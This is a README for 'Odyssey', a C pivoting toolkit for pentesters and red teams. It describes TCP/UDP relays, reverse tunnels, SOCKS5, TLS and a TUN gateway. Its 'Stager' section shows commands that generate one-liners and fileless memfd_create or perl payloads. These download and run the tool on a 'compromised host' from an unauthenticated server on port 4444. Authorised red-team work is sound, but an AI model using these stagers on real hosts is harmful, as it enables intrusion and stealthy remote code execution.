# Odyssey

[![Build](https://github.com/pablogonzalezpe/odyssey-toolkit/actions/workflows/ci.yml/badge.svg)](https://github.com/pablogonzalezpe/odyssey-toolkit/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-linux%20%7C%20windows-lightgrey.svg)](#build)
[![Release](https://img.shields.io/github/v/release/pablogonzalezpe/odyssey-toolkit)](https://github.com/pablogonzalezpe/odyssey-toolkit/releases)

A lightweight, single-binary pivoting toolkit written in C for network administration, pentesting and red team operations.

TCP and UDP relay, reverse tunneling with multiplexing, SOCKS5 proxy, TLS/mTLS transport, port-knocking, hot-reconfigurable binds, and a defensive L3 TUN gateway. All in one binary, no runtime dependencies.

## Features

### Core tunneling

- **Local relay (TCP).** TCP port-forwarding (`--listen`/`--to`) with multi-client support (fork on Linux, threads on Windows).
- **Local relay (UDP).** Userspace NAT table forwarding datagrams between clients and a target service (`--udp`). Configurable session timeout (`--udp-timeout-ms`). Useful for DNS, SNMP, syslog and other UDP protocols through a jumpbox.
- **Reverse tunnel.** Outbound control channel with token authentication, heartbeat, and automatic reconnection (exponential backoff + jitter).
- **Stream multiplexing.** Multiple concurrent data streams over a single control channel.
- **Multiple bind rules.** Forward several `LOCAL:REMOTE` pairs through one tunnel.
- **SOCKS5 reverse proxy.** Dynamic forwarding via `--socks-listen` (CONNECT, IPv4/domain). Optional username/password authentication.

### Security and transport

- **TLS / mTLS.** Optional OpenSSL-backed encryption for the control channel (`--tls-mode required|disabled`, `--require-mtls`).
- **Token policy.** Minimum 16 characters, weak/demo value rejection.
- **Source filtering.** Allow connections only from specific IPs or CIDR ranges (`--allow-source`).
- **Rate limiting.** Cap new connections per minute (`--rate-limit-per-min`).
- **Port-knocking.** Require a knock sequence before the control port accepts connections. Standalone `odyssey knock` command and automatic pre-connect knocking in `reverse-client`.
- **JSON logs.** Structured logging for observability (`--log-format json`).

### Dynamic control plane

- **Hot bind management.** Add, remove, and list bind rules at runtime without restarting the tunnel.
- **Admin CLI.** `odyssey admin` for out-of-band management (binds, streams, routes, policies, killswitch, snapshots).
- **Capabilities and status.** Query the running node for supported features, active streams, and runtime state.
- **Stream control.** List and close individual streams on demand.
- **Admin hardening.** Optional token requirement and rate limiting for admin actions.

### Defensive TUN gateway (Linux)

- **L3 tunnel mode.** `odyssey gateway` creates a local TUN interface and bridges real IP packets to a remote `tun-agent` over the control channel. The agent forwards traffic to the target network at L3, with return-path validation.
- **Deny-by-default.** Explicit `--route-allow` and `--allow-cidr` / `--allow-port` allowlists. `0.0.0.0/0` is blocked.
- **Dynamic route and policy management.** Add/remove allowed CIDRs, ports, and routes at runtime.
- **Killswitch.** Instantly stop all data-plane forwarding.
- **Runtime snapshot.** Export full node state (routes, policies, streams, killswitch) for diagnostics.

### Stager (initial access)

- **Stager server.** `odyssey stager-server` serves the Odyssey binary over a raw TCP socket. Supports optional token authentication and single-use mode.
- **One-liner generator.** `odyssey stager --format oneliner` prints a ready-to-paste one-liner that downloads and executes Odyssey. Linux (~85 chars, bash `/dev/tcp`) and Windows (~285 chars, PowerShell `TcpClient`).
- **Base64 mini-stager.** `odyssey stager --format base64` generates ~13 lines of base64 encoding a pre-compiled mini-stager (~18 KB) patched with the server address and token. The mini-stager authenticates, downloads Odyssey, and executes it in memory via `memfd_create` (Linux >= 3.17).
- **Shellcode stub (disk).** `odyssey stager --format stub` generates a one-line base64 payload with a 567-byte ELF stub that connects, downloads, and executes via `memfd_create` (fallback to `/tmp`).
- **Shellcode stub (RAM).** `odyssey stager --format stub-shm` writes the stub to `/dev/shm` (tmpfs) instead of disk. Requires exec-enabled `/dev/shm`.
- **Shellcode stub (fileless).** `odyssey stager --format stub-memfd` wraps the stub in a perl one-liner that loads it via `memfd_create`. Zero disk touch. Requires perl.
- **Pure perl fileless.** `odyssey stager --format perl-memfd` generates a ~200-char perl one-liner that downloads and executes entirely via `memfd_create`. Shortest fileless format.
- **Format catalog.** `odyssey stager --format list` prints all 7 delivery formats with line count, size, disk impact, and dependencies.

### Cross-platform

- Linux (native, primary target).
- Windows (MinGW cross-compile or native).
- Portable build kit for deploying on minimal Linux hosts (x64 and x86).

## Build

### Linux

```bash
make
```

OpenSSL is auto-detected via `pkg-config`. To force it off:

```bash
make CFLAGS="-O2 -Wall -Wextra -Wpedantic -std=c11 -Iinclude"
```

### Windows (MinGW)

```powershell
gcc -O2 -Wall -Wextra -Wpedantic -std=c11 -I.\include -o .\bin\odyssey.exe .\src\*.c -lws2_32
```

### Dual build (Windows + WSL)

```powershell
powershell -ExecutionPolicy Bypass -File .\scripts\build_all.ps1
```

### Portable Linux kit

A self-contained build kit for deploying on minimal Linux hosts (x64 and x86) is available in the [release archives](https://github.com/pablogonzalezpe/odyssey-toolkit/releases).

## Quick start

### 1. Local TCP relay

Forward local port 8080 to a remote service:

```bash
./bin/odyssey relay --listen 0.0.0.0:8080 --to 10.10.10.20:3389
```

### 2. Local UDP relay

Forward DNS queries through a jumpbox to an internal resolver:

```bash
./bin/odyssey relay --listen 0.0.0.0:53 --to 198.51.100.2:53 --udp --udp-timeout-ms 10000
```

### 3. Reverse tunnel

Prepare a shared token (minimum 16 characters):

```bash
printf 'my-secret-token!' > token.txt
```

Server side (operator):

```bash
./bin/odyssey reverse-server \
  --listen-control 0.0.0.0:9001 \
  --token-file ./token.txt \
  --tls-mode required \
  --tls-cert ./server.crt \
  --tls-key ./server.key \
  --bind 127.0.0.1:10080:10.10.20.15:80
```

Client side (target network):

```bash
./bin/odyssey reverse-client \
  --connect 203.0.113.10:9001 \
  --token-file ./token.txt \
  --tls-mode required \
  --tls-ca ./ca.crt
```

Now `curl http://127.0.0.1:10080` on the operator host reaches `10.10.20.15:80` through the target network.

### 4. SOCKS5 dynamic forwarding

Server side:

```bash
./bin/odyssey reverse-server \
  --listen-control 0.0.0.0:9001 \
  --token-file ./token.txt \
  --tls-mode required \
  --tls-cert ./server.crt \
  --tls-key ./server.key \
  --socks-listen 127.0.0.1:1080 \
  --socks-user pivot \
  --socks-pass-file ./socks_pass.txt
```

Client side:

```bash
./bin/odyssey reverse-client \
  --connect 203.0.113.10:9001 \
  --token-file ./token.txt \
  --tls-mode required \
  --tls-ca ./ca.crt
```

Use it:

```bash
curl --socks5-hostname 127.0.0.1:1080 --proxy-user pivot:YOUR_PASS http://10.10.20.15
```

### 5. Defensive TUN gateway (Linux, requires CAP_NET_ADMIN)

Gateway side (operator):

```bash
./bin/odyssey gateway \
  --listen-control 0.0.0.0:9001 \
  --token-file ./token.txt \
  --tls-mode required \
  --tls-cert ./server.crt \
  --tls-key ./server.key \
  --tun-name ody0 \
  --tun-cidr 10.240.0.1/24 \
  --route-allow 10.240.0.0/24 \
  --admin-listen 127.0.0.1:9002 \
  --admin-token-file ./admin_token.txt
```

Agent side (remote network, requires `ip_forward=1` and `proxy_arp=1`):

```bash
sysctl -w net.ipv4.ip_forward=1
sysctl -w net.ipv4.conf.all.proxy_arp=1

./bin/odyssey reverse-client \
  --mode tun-agent \
  --connect 203.0.113.10:9001 \
  --token-file ./token.txt \
  --tls-mode required \
  --tls-ca ./ca.crt \
  --allow-cidr 10.240.0.0/24 \
  --allow-port tcp:443 \
  --agent-tun-cidr 10.240.0.1/32
```

Manage at runtime:

```bash
odyssey admin --connect 127.0.0.1:9002 --token-file ./admin_token.txt route-list
odyssey admin --connect 127.0.0.1:9002 --token-file ./admin_token.txt route-add 10.241.0.0/24
odyssey admin --connect 127.0.0.1:9002 --token-file ./admin_token.txt killswitch on
odyssey admin --connect 127.0.0.1:9002 --token-file ./admin_token.txt snapshot
```

### 6. Stager (deploy Odyssey on a target)

**Option A: one-liner (needs TCP to stager-server)**

```bash
# Operator serves the binary
./bin/odyssey stager-server \
  --listen 0.0.0.0:4444 \
  --binary ./bin/odyssey \
  --no-auth --single-use --verbose

# Generate the one-liner
./bin/odyssey stager --connect 203.0.113.10:4444 --os linux --format oneliner \
  --run-args "relay --listen 0.0.0.0:8080 --to 198.51.100.2:80"
```

Paste the output on the compromised host. Odyssey downloads and starts relaying.

**Option B: base64 mini-stager (token auth, memfd)**

```bash
# Operator starts stager-server with token
./bin/odyssey stager-server --listen 0.0.0.0:5555 --binary ./bin/odyssey \
  --token "my-secret-token" \
  --args "relay --listen 0.0.0.0:8080 --to 198.51.100.2:80" --single-use

# Generate the mini-stager
./bin/odyssey stager --connect 203.0.113.10:5555 --os linux --format base64 \
  --token "my-secret-token"
```

Paste the output (~13 lines) on the target. The mini-stager authenticates, downloads Odyssey, and runs it in memory.

**Option C: shellcode stub (one-line, no-auth, disk/RAM/fileless)**

```bash
# Operator starts stager-server in no-auth mode (stubs use raw TCP)
./bin/odyssey stager-server --listen 0.0.0.0:4444 --binary ./bin/odyssey --no-auth

# Generate for disk (/tmp fallback), RAM (/dev/shm), or fully fileless (perl+memfd)
./bin/odyssey stager --connect 203.0.113.10:4444 --os linux --format stub
./bin/odyssey stager --connect 203.0.113.10:4444 --os linux --format stub-shm
./bin/odyssey stager --connect 203.0.113.10:4444 --os linux --format stub-memfd
```

**Option D: pure perl fileless (~200 chars, no compiled stub)**

```bash
./bin/odyssey stager --connect 203.0.113.10:4444 --os linux --format perl-memfd
```

**List all delivery formats:**

```bash
./bin/odyssey stager --format list
./bin/odyssey stager --format list --os linux
```

## Usage examples

More detailed scenarios are available in:

- [`examples/`](examples/) with shell scripts for relay and SOCKS5 demos.
- Step-by-step walkthroughs covering every feature in the [release archives](https://github.com/pablogonzalezpe/odyssey-toolkit/releases).

### Hardening options

```bash
./bin/odyssey relay \
  --listen 0.0.0.0:8080 \
  --to 10.10.10.20:3389 \
  --allow-source 203.0.113.0/24 \
  --rate-limit-per-min 120 \
  --knock-seq 7001,7002,7003 \
  --knock-open-ms 30000 \
  --log-format json
```

### Port-knocking

Standalone knock command:

```bash
./bin/odyssey knock --host 203.0.113.10 --seq 9101,9102 --delay-ms 120 --timeout-ms 1200
```

Automatic knocking before each reconnection:

```bash
./bin/odyssey reverse-client \
  --connect 203.0.113.10:9001 \
  --token-file ./token.txt \
  --tls-mode required \
  --tls-ca ./ca.crt \
  --knock-before-connect \
  --knock-host 203.0.113.10 \
  --knock-seq 9101,9102
```

## Architecture

```
Operator host                          Target network
┌─────────────────┐                    ┌─────────────────┐
│  reverse-server  │◄── control ──────│  reverse-client  │
│  or gateway      │    channel       │  or tun-agent    │
│                  │    (TLS+token)   │                  │
│  [binds/socks/   │                  │  [allow-target/  │
│   TUN iface]     │◄── data ────────│   allow-cidr]    │
└─────────────────┘    streams        └─────────────────┘
       │                                      │
   operator                             target services
   access                               (RDP, HTTP, ...)
```

The reverse-client initiates the outbound connection, making it firewall-friendly. All data flows through multiplexed streams over the authenticated control channel.

## Notes

- Endpoint format is `HOST:PORT` (IPv4 and hostname only). IPv6 literals are not yet supported.
- Default connect timeout is 5000 ms (`--connect-timeout-ms`).
- Default heartbeat is 5000 ms (timeout 15000 ms).
- Default max streams is 128.
- Default TLS mode in reverse is `required`.
- `--allow-source` accepts exact IP or IPv4 CIDR notation.
- Port-knocking requires `--allow-source` to be set.
- TLS backend requires compilation with OpenSSL (`OD_ENABLE_OPENSSL`). Use `--tls-mode disabled` for lab environments without certificates.
- TUN gateway agent requires `CAP_NET_ADMIN`, `/dev/net/tun`, `ip_forward=1`, and `proxy_arp=1`. Use `--agent-tun-cidr` to enable L3 forwarding on the agent side.

## Tests

Smoke tests cover every major feature. Run them on Linux:

```bash
for t in tests/smoke_*.sh; do
  echo "--- $t ---"
  bash "$t"
done
```

Some TUN-related tests require `CAP_NET_ADMIN` (root or appropriate capabilities).

## License

[MIT](LICENSE)
